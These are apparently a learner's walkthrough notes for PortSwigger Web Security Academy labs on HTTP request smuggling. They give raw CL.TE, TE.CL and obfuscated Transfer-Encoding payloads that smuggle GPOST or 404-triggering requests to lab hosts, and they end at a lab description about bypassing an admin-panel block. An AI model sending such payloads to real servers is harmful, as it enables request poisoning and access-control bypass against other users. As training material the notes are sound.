## Lab - 1: HTTP request smuggling, basic CL.TE vulnerability (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

- send this request twice

```
POST / HTTP/1.1
Host: 0a9a0041031fbe7dc1fe13ec000c0081.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Connection: keep-alive
Content-TYpe: application/x-www-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

G
```

- front end server will accept all and back end will execute only 0 and G is left for the first request and G is appended to the second request and will get an error

---

## Lab - 2: HTTP request smuggling, basic TE.CL vulnerability (P)

- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: 0ae3007c043a9f14c0d3485f00be006d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: alive

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

- Two `Enter` after 0 is important.

---

## Lab - 3: HTTP request smuggling, obfuscating the TE header (P)

- This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method. To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

```
POST / HTTP/1.1
Host: 0a0a00840493184ac0ff04e2006f00db.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Connection: keep-alive

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

# How to find

## Lab - 4: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: 0af100d70385f333c058ad5600e2006b.web-security-academy.net
Content-Type: application/x-www-url-encoded
Content-Length: 49
Transfer-Encoding: chunked
Connection: keep-alive

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

---

## Lab - 5: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses (P)

- This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

```
POST / HTTP/1.1
Host: 0ac700a003177acdc0485f6500160046.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

# How to exploit

## Lab - 6: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability (P)

- This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
